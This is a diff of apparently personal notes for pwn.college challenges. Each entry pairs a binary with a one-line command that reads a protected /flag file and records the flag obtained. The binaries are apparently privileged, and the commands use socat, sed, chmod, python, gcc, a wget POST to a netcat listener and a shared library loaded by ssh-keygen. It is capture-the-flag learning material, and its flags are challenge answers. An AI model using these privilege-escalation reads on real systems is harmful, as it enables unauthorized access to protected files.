@@ -102,3 +102,144 @@ pwn.college{IJZhZCIeFLX6yFrPzZ5i503PaSt.QXzYTMscTOxUzW}
 
 # 24 idk
 /usr/bin/env 
+
+# 25 idk
+
+# 26 idk
+
+# 27 idk
+/usr/bin/nice
+
+# 28 idk
+
+# 29 idk
+
+# 30 idk
+
+# 31 idk 
+
+# 32
+/usr/bin/socat
+LFILE=/flag
+socat -u "file:$LFILE" -
+pwn.college{AI0XAzn_Gs6LKb_PXbeeCmmyHlR.QX0cTMscTOxUzW}
+
+# 33 idk
+/usr/bin/whiptail
+
+# 34
+/usr/bin/awk
+awk '//' /flag
+pwn.college{kGuZM8HUlx3QrGIOPo5xE7LifE_.QX2cTMscTOxUzW}
+
+# 35
+/usr/bin/sed
+sed '' /flag
+pwn.college{UMdGXcaPsK7DLKc8jGoTd4UZQ8x.QX3cTMscTOxUzW}
+
+# 36 
+/usr/bin/ed
+ed /flag
+,p
+q
+pwn.college{UMdGXcaPsK7DLKc8jGoTd4UZQ8x.QX3cTMscTOxUzW}
+
+# 37
+/usr/bin/chown
+chown -R hacker:hacker /flag
+cat /flag
+pwn.college{UwRqYCyYL8wOCuizNxCtZcFwfbP.QX5cTMscTOxUzW}
+
+# 38
+/usr/bin/chmod
+chmod o+r /flag
+cat /flag
+pwn.college{UDzrFFnrQ2NwjUc8U2RQPX1kDp1.QXwgTMscTOxUzW}
+
+# 39
+/usr/bin/cp
+cp /flag /dev/stdout
+pwn.college{UDzrFFnrQ2NwjUc8U2RQPX1kDp1.QXwgTMscTOxUzW}
+
+# 40 IDK
+
+
+# 41
+/usr/bin/perl
+perl -ne print /flag
+pwn.college{Yt-PGJMLOjOi8cWUqrm9aYZFwDW.QXzgTMscTOxUzW}
+
+# 42
+/usr/bin/python
+python -c 'print(open("flag").read())'
+pwn.college{cFWP9P2ZEmwLLHcCkVTtCHRNwHN.QX0gTMscTOxUzW}
+
+# 43
+/usr/bin/ruby
+#ruby file
+#!/usr/bin/ruby
+fname = '/flag'
+content = File.read(fname)
+p content
+puts content
+pwn.college{8mHCzLCehXy8zUQGI-B7-tTgQRz.QX1gTMscTOxUzW}
+
+# 44
+/usr/bin/bash
+export LFILE=/flag
+bash -c 'echo "$(<$LFILE)"'
+FILE NOT READ 
+
+# 45
+/usr/bin/date
+LFILE=/flag
+date -f $LFILE
+pwn.college{MoYvMfjBdedPLxCG-qaI4ysijvb.QX3gTMscTOxUzW}
+
+#46
+/usr/bin/dmesg
+LFILE=/flag
+dmesg -rF "$LFILE"
+pwn.college{IQjeeKUQ9SzfU1EuKQURF-rt7sL.QX4gTMscTOxUzW}
+
+#47
+/usr/bin/wc
+LFILE=/flag
+wc --files0-from "$LFILE"
+pwn.college{4ApQc3dmt6PAf0tR0AQgusm-Hrk.QX5gTMscTOxUzW}
+
+#48
+usr/bin/gcc
+LFILE=/flag
+gcc -x c -E "$LFILE"
+pwn.college{kwi5_XMHXGXUR75AKtu6C3HGN9F.QXwkTMscTOxUzW}
+
+#49 
+/usr/bin/as
+LFILE=/flag
+as @$LFILE
+pwn.college{Un-8tpbcD9ZQCzFgUaQKBKSSwTX.QXxkTMscTOxUzW}
+
+#50
+wget --help 2>&1 | grep FILE
+#seperate tab
+nc -lp 80
+#main tab
+weget --post-file=/flag http://localhost
+FORGOT TO PUT KEY
+
+#51
+#program flag51.c:
+int main(int argc, char const *argv[])
+{
+        puts ("hello World");
+}
+
+int C_GetFunctionList()
+{
+        sendfile(1, open("/flag",0), 0, 4096);
+}
+
+gcc -shared flag51.c
+ssh-keygen -D ./a.out
+pwn.college{srBQB6F-pvZDJc-DXK3QdgOrbBm.QXzkTMscTOxUzW}
